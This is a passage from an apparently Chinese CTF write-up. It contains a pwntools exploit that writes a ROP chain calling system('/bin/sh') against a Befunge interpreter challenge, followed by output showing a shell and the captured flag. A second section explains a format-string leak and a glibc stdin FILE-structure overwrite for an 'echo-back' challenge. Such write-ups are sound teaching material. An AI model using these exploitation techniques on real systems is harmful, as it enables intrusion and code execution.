+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">6</span><span class="p">):</span>
+  <span class="n">stack_addr</span> <span class="o">+=</span> <span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+<span class="n">stack_addr</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">stack_addr</span><span class="o">+</span><span class="s1">&#39;</span><span class="se">\x00\x00</span><span class="s1">&#39;</span><span class="p">)</span>
+<span class="n">success</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">stack_addr</span><span class="p">))</span>
+<span class="n">rop_target</span> <span class="o">=</span> <span class="n">stack_addr</span> <span class="o">-</span> <span class="mh">0x128</span> <span class="o">+</span> <span class="mh">0x38</span>
+<span class="n">raw_input</span><span class="p">()</span>
+
+<span class="n">offset</span> <span class="o">=</span> <span class="n">rop_target</span> <span class="o">-</span> <span class="n">progbuf_addr</span>
+<span class="n">prdir</span> <span class="o">=</span> <span class="mh">0x120c</span> <span class="o">+</span> <span class="n">elf_base</span>
+<span class="n">binsh_addr</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x18cd57</span> 
+<span class="n">system_addr</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x045390</span>
+
+<span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;info&#39;</span>
+
+<span class="c1"># write(progbuf_addr + offset, value, 8)</span>
+<span class="k">def</span> <span class="nf">edit</span><span class="p">(</span><span class="n">offset</span><span class="p">,</span> <span class="n">value</span><span class="p">):</span>
+  <span class="n">x</span> <span class="o">=</span> <span class="n">offset</span> <span class="o">/</span> <span class="mi">80</span>
+  <span class="n">y</span> <span class="o">=</span> <span class="n">offset</span> <span class="o">%</span> <span class="mi">80</span>
+  <span class="n">x_1</span> <span class="o">=</span> <span class="n">x</span> <span class="o">/</span> <span class="mi">50000</span>
+  <span class="n">x_2</span> <span class="o">=</span> <span class="n">x</span> <span class="o">%</span> <span class="mi">50000</span>
+  <span class="n">success</span><span class="p">(</span><span class="n">x_1</span><span class="p">)</span>
+  <span class="n">success</span><span class="p">(</span><span class="n">x_2</span><span class="p">)</span>
+  <span class="n">success</span><span class="p">(</span><span class="n">y</span><span class="p">)</span>
+  <span class="n">success</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">value</span><span class="p">))</span>
+  <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">8</span><span class="p">):</span>
+    <span class="n">val</span> <span class="o">=</span> <span class="n">value</span> <span class="o">&amp;</span> <span class="mh">0xff</span>
+    <span class="n">value</span> <span class="o">=</span> <span class="n">value</span> <span class="o">&gt;&gt;</span> <span class="mi">8</span>
+    <span class="n">success</span><span class="p">(</span><span class="s2">&#34;round</span><span class="si">{}</span><span class="s2">: val:</span><span class="si">{}</span><span class="s2"> | y:</span><span class="si">{}</span><span class="s2"> | x_1:</span><span class="si">{}</span><span class="s2"> | x_2:</span><span class="si">{}</span><span class="s2"> | write at:</span><span class="si">{}</span><span class="s2">&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="nb">hex</span><span class="p">(</span><span class="n">val</span><span class="p">),</span> <span class="n">y</span><span class="o">+</span><span class="n">i</span><span class="p">,</span> <span class="n">x_1</span><span class="p">,</span> <span class="n">x_2</span><span class="p">,</span> <span class="nb">hex</span><span class="p">((</span><span class="n">x_1</span><span class="o">*</span><span class="mi">50000</span><span class="o">+</span><span class="n">x_2</span><span class="p">)</span><span class="o">*</span><span class="mi">80</span><span class="o">+</span><span class="n">y</span><span class="o">+</span><span class="n">i</span><span class="o">+</span><span class="n">progbuf_addr</span><span class="p">)))</span>
+    <span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">val</span><span class="p">))</span>
+    <span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">y</span><span class="o">+</span><span class="n">i</span><span class="p">))</span>
+    <span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">x_1</span><span class="p">))</span>
+    <span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="mi">50000</span><span class="p">))</span>
+    <span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">x_2</span><span class="p">))</span>
+
+<span class="n">edit</span><span class="p">(</span><span class="n">offset</span><span class="p">,</span> <span class="n">prdir</span><span class="p">)</span>
+<span class="n">edit</span><span class="p">(</span><span class="n">offset</span><span class="o">+</span><span class="mi">8</span><span class="p">,</span> <span class="n">binsh_addr</span><span class="p">)</span>
+<span class="n">edit</span><span class="p">(</span><span class="n">offset</span><span class="o">+</span><span class="mi">16</span><span class="p">,</span> <span class="n">system_addr</span><span class="p">)</span>
+
+<span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>成功与服务器交互</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="o">[</span>+<span class="o">]</span> <span class="m">11470264</span>
+<span class="o">[</span>+<span class="o">]</span> <span class="m">27054</span>
+<span class="o">[</span>+<span class="o">]</span> <span class="m">56</span>
+<span class="o">[</span>+<span class="o">]</span> 0x56434fd4f20c
+<span class="o">[</span>+<span class="o">]</span> round0: val:0xc <span class="p">|</span> y:56 <span class="p">|</span> x_1:11470264 <span class="p">|</span> x_2:27054 <span class="p">|</span> write at:0x7ffdd4217ed8
+<span class="o">[</span>+<span class="o">]</span> round1: val:0xf2 <span class="p">|</span> y:57 <span class="p">|</span> x_1:11470264 <span class="p">|</span> x_2:27054 <span class="p">|</span> write at:0x7ffdd4217ed9
+<span class="o">[</span>+<span class="o">]</span> round2: val:0xd4 <span class="p">|</span> y:58 <span class="p">|</span> x_1:11470264 <span class="p">|</span> x_2:27054 <span class="p">|</span> write at:0x7ffdd4217eda
+<span class="o">[</span>+<span class="o">]</span> round3: val:0x4f <span class="p">|</span> y:59 <span class="p">|</span> x_1:11470264 <span class="p">|</span> x_2:27054 <span class="p">|</span> write at:0x7ffdd4217edb
+<span class="o">[</span>+<span class="o">]</span> round4: val:0x43 <span class="p">|</span> y:60 <span class="p">|</span> x_1:11470264 <span class="p">|</span> x_2:27054 <span class="p">|</span> write at:0x7ffdd4217edc
+<span class="o">[</span>+<span class="o">]</span> round5: val:0x56 <span class="p">|</span> y:61 <span class="p">|</span> x_1:11470264 <span class="p">|</span> x_2:27054 <span class="p">|</span> write at:0x7ffdd4217edd
+<span class="o">[</span>+<span class="o">]</span> round6: val:0x0 <span class="p">|</span> y:62 <span class="p">|</span> x_1:11470264 <span class="p">|</span> x_2:27054 <span class="p">|</span> write at:0x7ffdd4217ede
+<span class="o">[</span>+<span class="o">]</span> round7: val:0x0 <span class="p">|</span> y:63 <span class="p">|</span> x_1:11470264 <span class="p">|</span> x_2:27054 <span class="p">|</span> write at:0x7ffdd4217edf
+<span class="o">[</span>+<span class="o">]</span> <span class="m">11470264</span>
+<span class="o">[</span>+<span class="o">]</span> <span class="m">27054</span>
+<span class="o">[</span>+<span class="o">]</span> <span class="m">64</span>
+<span class="o">[</span>+<span class="o">]</span> 0x7f9040bcfd57
+<span class="o">[</span>+<span class="o">]</span> round0: val:0x57 <span class="p">|</span> y:64 <span class="p">|</span> x_1:11470264 <span class="p">|</span> x_2:27054 <span class="p">|</span> write at:0x7ffdd4217ee0
+<span class="o">[</span>+<span class="o">]</span> round1: val:0xfd <span class="p">|</span> y:65 <span class="p">|</span> x_1:11470264 <span class="p">|</span> x_2:27054 <span class="p">|</span> write at:0x7ffdd4217ee1
+<span class="o">[</span>+<span class="o">]</span> round2: val:0xbc <span class="p">|</span> y:66 <span class="p">|</span> x_1:11470264 <span class="p">|</span> x_2:27054 <span class="p">|</span> write at:0x7ffdd4217ee2
+<span class="o">[</span>+<span class="o">]</span> round3: val:0x40 <span class="p">|</span> y:67 <span class="p">|</span> x_1:11470264 <span class="p">|</span> x_2:27054 <span class="p">|</span> write at:0x7ffdd4217ee3
+<span class="o">[</span>+<span class="o">]</span> round4: val:0x90 <span class="p">|</span> y:68 <span class="p">|</span> x_1:11470264 <span class="p">|</span> x_2:27054 <span class="p">|</span> write at:0x7ffdd4217ee4
+<span class="o">[</span>+<span class="o">]</span> round5: val:0x7f <span class="p">|</span> y:69 <span class="p">|</span> x_1:11470264 <span class="p">|</span> x_2:27054 <span class="p">|</span> write at:0x7ffdd4217ee5
+<span class="o">[</span>+<span class="o">]</span> round6: val:0x0 <span class="p">|</span> y:70 <span class="p">|</span> x_1:11470264 <span class="p">|</span> x_2:27054 <span class="p">|</span> write at:0x7ffdd4217ee6
+<span class="o">[</span>+<span class="o">]</span> round7: val:0x0 <span class="p">|</span> y:71 <span class="p">|</span> x_1:11470264 <span class="p">|</span> x_2:27054 <span class="p">|</span> write at:0x7ffdd4217ee7
+<span class="o">[</span>+<span class="o">]</span> <span class="m">11470264</span>
+<span class="o">[</span>+<span class="o">]</span> <span class="m">27054</span>
+<span class="o">[</span>+<span class="o">]</span> <span class="m">72</span>
+<span class="o">[</span>+<span class="o">]</span> 0x7f9040a88390
+<span class="o">[</span>+<span class="o">]</span> round0: val:0x90 <span class="p">|</span> y:72 <span class="p">|</span> x_1:11470264 <span class="p">|</span> x_2:27054 <span class="p">|</span> write at:0x7ffdd4217ee8
+<span class="o">[</span>+<span class="o">]</span> round1: val:0x83 <span class="p">|</span> y:73 <span class="p">|</span> x_1:11470264 <span class="p">|</span> x_2:27054 <span class="p">|</span> write at:0x7ffdd4217ee9
+<span class="o">[</span>+<span class="o">]</span> round2: val:0xa8 <span class="p">|</span> y:74 <span class="p">|</span> x_1:11470264 <span class="p">|</span> x_2:27054 <span class="p">|</span> write at:0x7ffdd4217eea
+<span class="o">[</span>+<span class="o">]</span> round3: val:0x40 <span class="p">|</span> y:75 <span class="p">|</span> x_1:11470264 <span class="p">|</span> x_2:27054 <span class="p">|</span> write at:0x7ffdd4217eeb
+<span class="o">[</span>+<span class="o">]</span> round4: val:0x90 <span class="p">|</span> y:76 <span class="p">|</span> x_1:11470264 <span class="p">|</span> x_2:27054 <span class="p">|</span> write at:0x7ffdd4217eec
+<span class="o">[</span>+<span class="o">]</span> round5: val:0x7f <span class="p">|</span> y:77 <span class="p">|</span> x_1:11470264 <span class="p">|</span> x_2:27054 <span class="p">|</span> write at:0x7ffdd4217eed
+<span class="o">[</span>+<span class="o">]</span> round6: val:0x0 <span class="p">|</span> y:78 <span class="p">|</span> x_1:11470264 <span class="p">|</span> x_2:27054 <span class="p">|</span> write at:0x7ffdd4217eee
+<span class="o">[</span>+<span class="o">]</span> round7: val:0x0 <span class="p">|</span> y:79 <span class="p">|</span> x_1:11470264 <span class="p">|</span> x_2:27054 <span class="p">|</span> write at:0x7ffdd4217eef
+<span class="o">[</span>*<span class="o">]</span> Switching to interactive mode
+Too many steps. Is there any infinite loops?
+$ ls
+befunge
+bin
+dev
+flag
+lib
+lib32
+lib64
+$ cat flag
+cyberpeace<span class="o">{</span>98a98f0ba1ad006fb670b684a2c0c129<span class="o">}</span>
+Time out
+<span class="o">[</span>*<span class="o">]</span> Got EOF <span class="k">while</span> reading in interactive
+$ 
+</code></pre></td></tr></table>
+</div>
+</div><h3 id="参考资料">参考资料</h3>
+<p>[1] <a href="http://www.matrix67.com/blog/archives/253" target="_blank" rel="noopener noreffer">http://www.matrix67.com/blog/archives/253</a></p>
+<p>[2] <a href="https://www.jianshu.com/p/ed929cf72312" target="_blank" rel="noopener noreffer">https://www.jianshu.com/p/ed929cf72312</a></p>
+<p>[3] <a href="http://quadium.net/funge/spec98.html" target="_blank" rel="noopener noreffer">http://quadium.net/funge/spec98.html</a></p>
+<h2 id="echo-back">echo-back</h2>
+<h3 id="checksec">checksec</h3>
+<p>64位程序，保护全开，无法修改got表</p>
+<h3 id="漏洞">漏洞</h3>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://i.loli.net/2020/04/15/ctDxfSMpTl3jIdy.png"
+        data-srcset="https://i.loli.net/2020/04/15/ctDxfSMpTl3jIdy.png, https://i.loli.net/2020/04/15/ctDxfSMpTl3jIdy.png 1.5x, https://i.loli.net/2020/04/15/ctDxfSMpTl3jIdy.png 2x"
+        data-sizes="auto"
+        alt="https://i.loli.net/2020/04/15/ctDxfSMpTl3jIdy.png"
+        title="20200414205804.png" /></p>
+<p>在上图函数中有明显的格式化字符串漏洞，但允许输入的字符只有7个，连一个p64都装不下。</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://i.loli.net/2020/04/15/oRE75dJgyKvkeWz.png"
+        data-srcset="https://i.loli.net/2020/04/15/oRE75dJgyKvkeWz.png, https://i.loli.net/2020/04/15/oRE75dJgyKvkeWz.png 1.5x, https://i.loli.net/2020/04/15/oRE75dJgyKvkeWz.png 2x"
+        data-sizes="auto"
+        alt="https://i.loli.net/2020/04/15/oRE75dJgyKvkeWz.png"
+        title="20200414205921.png" /></p>
+<p>main函数可以一直循环，在上述两个函数中选择，目前来看<code>name</code> 并没有什么作用。</p>
+<p>由于格式化字符串太短无法直接改写返回地址，考虑攻击scanf()绕过大小限制，再写返回地址，分为如下几步</p>
+<h3 id="获取stdin地址">获取<code>stdin</code>地址</h3>
+<p>我们知道栈上可能有某些关键地址，同时由于程序开启了PIE保护，必须利用格式化字符串先泄露libc与elf的基地址才能进一步攻击。观察echo_back函数return前栈的内容，可以发现在rsp+8偏移处有elf_base相关地址，在rsp+13编译处有libc_base相关地址，现在需要通过调试把找到具体的位置，把它们泄露出来</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://i.loli.net/2020/04/15/765toHBTSRFCjDE.png"
+        data-srcset="https://i.loli.net/2020/04/15/765toHBTSRFCjDE.png, https://i.loli.net/2020/04/15/765toHBTSRFCjDE.png 1.5x, https://i.loli.net/2020/04/15/765toHBTSRFCjDE.png 2x"
+        data-sizes="auto"
+        alt="https://i.loli.net/2020/04/15/765toHBTSRFCjDE.png"
+        title="20200414205959.png" /></p>
+<p>根据调试，分别输入*%14$p* 与*%19$p* 可以得到。当然其实我们还需要泄露一个返回地址<font color=red>所在位置</font>，以便最后为了改写。注意，<font color=red>因为我们能泄露的是地址的内容而不是地址</font>，所以这里我们只能选择泄露rbp内容，[rbp]+8处存放main函数返回地址。可以输入*%12$p* 得到。从而得到stdin地址。</p>
+<h3 id="攻击stdin结构">攻击<code>stdin</code>结构</h3>
+<p>由scanf()源码可知，它通过stdin的FILE结构暂存输入流，然后输入到指定位置。下面是scanf()的核心实现函数_IO_new_file_underflow()源码：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span><span class="lnt">63
+</span><span class="lnt">64
+</span><span class="lnt">65
+</span><span class="lnt">66
+</span><span class="lnt">67
+</span><span class="lnt">68
+</span><span class="lnt">69
+</span><span class="lnt">70
+</span><span class="lnt">71
+</span><span class="lnt">72
+</span><span class="lnt">73
+</span><span class="lnt">74
+</span><span class="lnt">75
+</span><span class="lnt">76
+</span><span class="lnt">77
+</span><span class="lnt">78
+</span><span class="lnt">79
+</span><span class="lnt">80
+</span><span class="lnt">81
+</span><span class="lnt">82
+</span><span class="lnt">83
+</span><span class="lnt">84
+</span><span class="lnt">85
+</span><span class="lnt">86
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="kt">int</span> <span class="nf">_IO_new_file_underflow</span> <span class="p">(</span><span class="n">_IO_FILE</span> <span class="o">*</span><span class="n">fp</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="n">_IO_ssize_t</span> <span class="n">count</span><span class="p">;</span>
+<span class="cp">#if 0</span><span class="c">
+</span><span class="c">  /* SysV does not make this test; take it out for compatibility */
+</span><span class="c">  if (fp-&gt;_flags &amp; _IO_EOF_SEEN)
+</span><span class="c">    return (EOF);
+</span><span class="c"></span><span class="cp">#endif
+</span><span class="cp"></span>
+  <span class="k">if</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_flags</span> <span class="o">&amp;</span> <span class="n">_IO_NO_READS</span><span class="p">)</span>
+    <span class="p">{</span>
+      <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_flags</span> <span class="o">|=</span> <span class="n">_IO_ERR_SEEN</span><span class="p">;</span>
+      <span class="n">__set_errno</span> <span class="p">(</span><span class="n">EBADF</span><span class="p">);</span>
+      <span class="k">return</span> <span class="n">EOF</span><span class="p">;</span>
+    <span class="p">}</span>
+  <span class="cm">/*!!!!!*/</span>
+  <span class="k">if</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_ptr</span> <span class="o">&lt;</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_end</span><span class="p">)</span>              
+    <span class="k">return</span> <span class="o">*</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">*</span><span class="p">)</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_ptr</span><span class="p">;</span>        
+  <span class="k">if</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_buf_base</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span>
+    <span class="p">{</span>
+      <span class="cm">/* Maybe we already have a push back pointer.  */</span>
+      <span class="k">if</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_save_base</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span>
+    <span class="p">{</span>
+      <span class="n">free</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_save_base</span><span class="p">);</span>
+      <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_flags</span> <span class="o">&amp;=</span> <span class="o">~</span><span class="n">_IO_IN_BACKUP</span><span class="p">;</span>
+    <span class="p">}</span>
+      <span class="n">_IO_doallocbuf</span> <span class="p">(</span><span class="n">fp</span><span class="p">);</span>
+    <span class="p">}</span>
+
+  <span class="cm">/* Flush all line buffered files before reading. */</span>
+  <span class="cm">/* FIXME This can/should be moved to genops ?? */</span>
+  <span class="k">if</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_flags</span> <span class="o">&amp;</span> <span class="p">(</span><span class="n">_IO_LINE_BUF</span><span class="o">|</span><span class="n">_IO_UNBUFFERED</span><span class="p">))</span>
+    <span class="p">{</span>
+<span class="cp">#if 0</span><span class="c">
+</span><span class="c">      _IO_flush_all_linebuffered ();
+</span><span class="c"></span><span class="cp">#else
+</span><span class="cp"></span>      <span class="cm">/* We used to flush all line-buffered stream.  This really isn&#39;t
+</span><span class="cm">     required by any standard.  My recollection is that
+</span><span class="cm">     traditional Unix systems did this for stdout.  stderr better
+</span><span class="cm">     not be line buffered.  So we do just that here
+</span><span class="cm">     explicitly.  --drepper */</span>
+      <span class="n">_IO_acquire_lock</span> <span class="p">(</span><span class="n">_IO_stdout</span><span class="p">);</span>
+
+      <span class="k">if</span> <span class="p">((</span><span class="n">_IO_stdout</span><span class="o">-&gt;</span><span class="n">_flags</span> <span class="o">&amp;</span> <span class="p">(</span><span class="n">_IO_LINKED</span> <span class="o">|</span> <span class="n">_IO_NO_WRITES</span> <span class="o">|</span> <span class="n">_IO_LINE_BUF</span><span class="p">))</span>
+      <span class="o">==</span> <span class="p">(</span><span class="n">_IO_LINKED</span> <span class="o">|</span> <span class="n">_IO_LINE_BUF</span><span class="p">))</span>
+    <span class="n">_IO_OVERFLOW</span> <span class="p">(</span><span class="n">_IO_stdout</span><span class="p">,</span> <span class="n">EOF</span><span class="p">);</span>
+
+      <span class="n">_IO_release_lock</span> <span class="p">(</span><span class="n">_IO_stdout</span><span class="p">);</span>
+<span class="cp">#endif
+</span><span class="cp"></span>    <span class="p">}</span>
+
+  <span class="n">_IO_switch_to_get_mode</span> <span class="p">(</span><span class="n">fp</span><span class="p">);</span>
+
+  <span class="cm">/* This is very tricky. We have to adjust those
+</span><span class="cm">     pointers before we call _IO_SYSREAD () since
+</span><span class="cm">     we may longjump () out while waiting for
+</span><span class="cm">     input. Those pointers may be screwed up. H.J. */</span>
+  <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_base</span> <span class="o">=</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_ptr</span> <span class="o">=</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_buf_base</span><span class="p">;</span>
+  <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_end</span> <span class="o">=</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_buf_base</span><span class="p">;</span>
+  <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_write_base</span> <span class="o">=</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_write_ptr</span> <span class="o">=</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_write_end</span>
+    <span class="o">=</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_buf_base</span><span class="p">;</span>
+  <span class="cm">/*!!!!!*/</span>
+  <span class="n">count</span> <span class="o">=</span> <span class="n">_IO_SYSREAD</span> <span class="p">(</span><span class="n">fp</span><span class="p">,</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_buf_base</span><span class="p">,</span>                 
+               <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_buf_end</span> <span class="o">-</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_buf_base</span><span class="p">);</span>         
+  <span class="k">if</span> <span class="p">(</span><span class="n">count</span> <span class="o">&lt;=</span> <span class="mi">0</span><span class="p">)</span>
+    <span class="p">{</span>
+      <span class="k">if</span> <span class="p">(</span><span class="n">count</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span>
+    <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_flags</span> <span class="o">|=</span> <span class="n">_IO_EOF_SEEN</span><span class="p">;</span>
+      <span class="k">else</span>
+    <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_flags</span> <span class="o">|=</span> <span class="n">_IO_ERR_SEEN</span><span class="p">,</span> <span class="n">count</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+  <span class="p">}</span>
+    <span class="cm">/*!!!!!*/</span>
+  <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_end</span> <span class="o">+=</span> <span class="n">count</span><span class="p">;</span>
+  <span class="k">if</span> <span class="p">(</span><span class="n">count</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span>
+    <span class="p">{</span>
+      <span class="cm">/* If a stream is read to EOF, the calling application may switch active
+</span><span class="cm">     handles.  As a result, our offset cache would no longer be valid, so
+</span><span class="cm">     unset it.  */</span>
+      <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_offset</span> <span class="o">=</span> <span class="n">_IO_pos_BAD</span><span class="p">;</span>
+      <span class="k">return</span> <span class="n">EOF</span><span class="p">;</span>
+    <span class="p">}</span>
+  <span class="k">if</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_offset</span> <span class="o">!=</span> <span class="n">_IO_pos_BAD</span><span class="p">)</span>
+    <span class="n">_IO_pos_adjust</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_offset</span><span class="p">,</span> <span class="n">count</span><span class="p">);</span>
+  <span class="k">return</span> <span class="o">*</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">*</span><span class="p">)</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_ptr</span><span class="p">;</span>
+<span class="p">}</span>
+
+</code></pre></td></tr></table>
+</div>
+</div><p>注意其中<code>/*!!!!!*/</code>标识的三处是我们攻击FILE结构时需要注意的地方</p>
+<blockquote>
+<p>当stdin-&gt;_IO_read_ptr大于等于stdin-&gt;_IO_read_end时，此函数会调用_IO_SYSREAD()在stdin-&gt;_IO_buf_base处读入stdin-&gt;_IO_buf_end - stdin-&gt;_IO_buf_base个字节，然后更新stdin-&gt;_IO_read_end的值</p>
+</blockquote>
+<p>我们知道了<code>stdin</code>的地址后可以利用格式化字符串漏洞将<code>stdin</code>的FILE的<code>IO_buf_base</code>修改为main函数的返回值所在地址，即可以实现改写返回地址。但在这之前不要忘了我们只能输入7个格式化字符，我们能用这7个字符干什么呢？先调试看看吧</p>
+<p>在<code>echo_back</code>返回之前，我们查看<code>stdin</code>的结构，可以看到<code>echo_back</code>结束后<code>stdin-&gt;_IO_read_ptr</code>是等于<code>stdin-&gt;_IO_read_end</code>的，在下次执行<code>echo_back</code>之前我们希望能修改<code>stdin-&gt;_IO_buf_base</code>的值。这里我们想到通过格式化字符串写<code>stdin-&gt;_IO_buf_base</code>，但由于字数限制又不能直接写成main函数的返回地址处。</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://i.loli.net/2020/04/15/VKjCf4HpwyT25FY.png"
+        data-srcset="https://i.loli.net/2020/04/15/VKjCf4HpwyT25FY.png, https://i.loli.net/2020/04/15/VKjCf4HpwyT25FY.png 1.5x, https://i.loli.net/2020/04/15/VKjCf4HpwyT25FY.png 2x"
+        data-sizes="auto"
+        alt="https://i.loli.net/2020/04/15/VKjCf4HpwyT25FY.png"
+        title="20200414210039.png" /></p>
